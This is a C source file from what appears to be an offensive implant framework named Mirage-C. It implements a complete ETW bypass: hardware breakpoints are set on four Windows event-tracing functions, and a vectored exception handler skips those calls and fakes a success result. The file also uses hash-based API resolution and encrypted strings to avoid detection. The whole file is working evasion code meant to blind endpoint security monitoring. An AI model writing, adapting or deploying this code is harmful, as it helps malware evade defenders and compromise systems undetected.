/*
 * etw_bypass.c — ETW bypass for Mirage-C
 *
 * Hardware breakpoint technique: sets DR0-DR3 on up to 4 ETW
 * functions (EtwEventWrite, EtwEventWriteEx, EtwEventWriteString,
 * EtwTiSetProviderState), installs a VEH that intercepts execution
 * and returns STATUS_SUCCESS (0) without patching .text section.
 */

#include "etw_bypass.h"
#include "config.h"
#include "engine.h"

#ifdef ENABLE_ETW_BYPASS
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "nt_types.h"
#include "mirage_asm.h"
#include "enc_strings.h"
#include <string.h>


/* ── CONTEXT offsets for x64 ──────────────────────────────── */

#define CTX_RAX   0x078
#define CTX_RSP   0x098
#define CTX_RIP   0x0f8
#define CTX_DR0   0x048
#define CTX_DR1   0x050
#define CTX_DR2   0x058
#define CTX_DR3   0x060
#define CTX_DR7   0x070

#ifndef EXCEPTION_SINGLE_STEP
#define EXCEPTION_SINGLE_STEP  0x80000004
#endif
#define DR7_ENABLE_DR0_EXE  0x0000000000000001ULL
#define DR7_ENABLE_DR1_EXE  0x0000000000000004ULL
#define DR7_ENABLE_DR2_EXE  0x0000000000000010ULL
#define DR7_ENABLE_DR3_EXE  0x0000000000000040ULL
#define MAX_ETW_TARGETS     4

/* ── Function pointer types ───────────────────────────────── */

typedef void* (WINAPI *pRtlAddVectoredExceptionHandler)(ULONG, void *);
typedef ULONG (WINAPI *pRtlRemoveVectoredExceptionHandler)(void *);

/* ── State ────────────────────────────────────────────────── */

static void *g_etw_targets[MAX_ETW_TARGETS];
static int   g_etw_count = 0;
static void *g_veh_handle = NULL;
static pRtlRemoveVectoredExceptionHandler g_fnRemoveVEH = NULL;
/* ── VEH handler ──────────────────────────────────────────── */

static LONG CALLBACK etw_veh_handler(EXCEPTION_POINTERS *ep) {
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return 0;

    DWORD64 *ctx = (DWORD64 *)ep->ContextRecord;
    DWORD64 rip = ctx[CTX_RIP / 8];

    int i, match = 0;
    for (i = 0; i < g_etw_count; i++) {
        if ((void *)rip == g_etw_targets[i]) { match = 1; break; }
    }
    if (!match) return 0;

    DWORD64 rsp = ctx[CTX_RSP / 8];
    DWORD64 ret_addr = *(DWORD64 *)rsp;

    ctx[CTX_RIP / 8] = ret_addr;
    ctx[CTX_RSP / 8] = rsp + 8;
    ctx[CTX_RAX / 8] = 0; /* STATUS_SUCCESS */

    return EXCEPTION_CONTINUE_EXECUTION;
}

static void* resolve_func(void* mod, const char* name) {
    uint32_t h = mirage_encrypted_hash_func(name);
    return mirage_get_function_by_hash(mod, h);
}

/* ── Cleanup ──────────────────────────────────────────────── */

static void etw_cleanup(void) {
    if (g_veh_handle && g_fnRemoveVEH) {
        g_fnRemoveVEH(g_veh_handle);
        g_veh_handle = NULL;
    }
    if (g_etw_count > 0) {
        CONTEXT ctx;
        memset(&ctx, 0, sizeof(ctx));
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        NTSTATUS st = NtGetContextThread_stub(
            (uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
        if (st >= 0) {
            *(DWORD64 *)((char *)&ctx + CTX_DR0) = 0;
            *(DWORD64 *)((char *)&ctx + CTX_DR1) = 0;
            *(DWORD64 *)((char *)&ctx + CTX_DR2) = 0;
            *(DWORD64 *)((char *)&ctx + CTX_DR3) = 0;
            *(DWORD64 *)((char *)&ctx + CTX_DR7) = 0;
            NtSetContextThread_stub(
                (uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
        }
        memset(g_etw_targets, 0, sizeof(g_etw_targets));
        g_etw_count = 0;
    }
}

/* ── mirage_patch_etw ─────────────────────────────────────── */

int mirage_patch_etw(void) {
    char ntdll_name[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, ntdll_name);
    void* ntdll = mirage_get_module_by_hash(
        mirage_encrypted_hash_module(ntdll_name));
    if (!ntdll) return 0;

    /* Resolve all 4 ETW targets */
    char fn[64];
    void *targets[MAX_ETW_TARGETS] = {0};
    int tcnt = 0;

    /* 0: EtwEventWrite (fallback to EtwEventWriteEx) */
    enc_decrypt(enc_EtwEventWrite, ENC_ETWEVENTWRITE_LEN, fn);
    void* p = resolve_func(ntdll, fn);
    if (!p) {
        enc_decrypt(enc_EtwEventWriteEx, ENC_ETWEVENTWRITEEX_LEN, fn);
        p = resolve_func(ntdll, fn);
    }
    if (p) targets[tcnt++] = p;

    /* 1: EtwEventWriteEx */
    enc_decrypt(enc_EtwEventWriteEx, ENC_ETWEVENTWRITEEX_LEN, fn);
    p = resolve_func(ntdll, fn);
    if (p && p != targets[0]) targets[tcnt++] = p;

    /* 2: EtwEventWriteString */
    enc_decrypt(enc_EtwEventWriteString, ENC_ETWEVENTWRITESTRING_LEN, fn);
    p = resolve_func(ntdll, fn);
    if (p) {
        int dup = 0;
        for (int j = 0; j < tcnt; j++) { if (p == targets[j]) { dup = 1; break; } }
        if (!dup) targets[tcnt++] = p;
    }

    /* 3: EtwTiSetProviderState */
    enc_decrypt(enc_EtwTiSetProviderState, ENC_ETWTISETPROVIDERSTATE_LEN, fn);
    p = resolve_func(ntdll, fn);
    if (p) {
        int dup = 0;
        for (int j = 0; j < tcnt; j++) { if (p == targets[j]) { dup = 1; break; } }
        if (!dup) targets[tcnt++] = p;
    }

    if (tcnt == 0) return 0;

    /* Resolve VEH functions */
    char veh_add[64]; enc_decrypt(enc_RtlAddVectoredExceptionHandler, ENC_RTLADDVECTOREDEXCEPTIONHANDLER_LEN, veh_add);
    pRtlAddVectoredExceptionHandler fnAddVEH =
        (pRtlAddVectoredExceptionHandler)resolve_func(ntdll, veh_add);
    char veh_rem[64]; enc_decrypt(enc_RtlRemoveVectoredExceptionHandler, ENC_RTLREMOVEVECTOREDEXCEPTIONHANDLER_LEN, veh_rem);
    g_fnRemoveVEH = (pRtlRemoveVectoredExceptionHandler)resolve_func(ntdll, veh_rem);
    if (!fnAddVEH || !g_fnRemoveVEH) return 0;

    /* Install VEH */
    g_veh_handle = fnAddVEH(1, etw_veh_handler);
    if (!g_veh_handle) return 0;

    /* Set DR0-DR3 on all resolved targets */
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    NTSTATUS st = NtGetContextThread_stub(
        (uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
    if (st < 0) { etw_cleanup(); return 0; }

    static const DWORD64 dr_offsets[4] = { CTX_DR0, CTX_DR1, CTX_DR2, CTX_DR3 };
    static const DWORD64 dr_flags[4]   = { DR7_ENABLE_DR0_EXE, DR7_ENABLE_DR1_EXE, DR7_ENABLE_DR2_EXE, DR7_ENABLE_DR3_EXE };

    DWORD64 dr7_val = 0;
    for (int i = 0; i < tcnt; i++) {
        *(DWORD64 *)((char *)&ctx + dr_offsets[i]) = (DWORD64)targets[i];
        dr7_val |= dr_flags[i];
    }
    *(DWORD64 *)((char *)&ctx + CTX_DR7) = dr7_val;

    st = NtSetContextThread_stub(
        (uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
    if (st < 0) { etw_cleanup(); return 0; }

    memcpy(g_etw_targets, targets, tcnt * sizeof(void*));
    g_etw_count = tcnt;
    return 1;
}

#endif /* ENABLE_ETW_BYPASS */
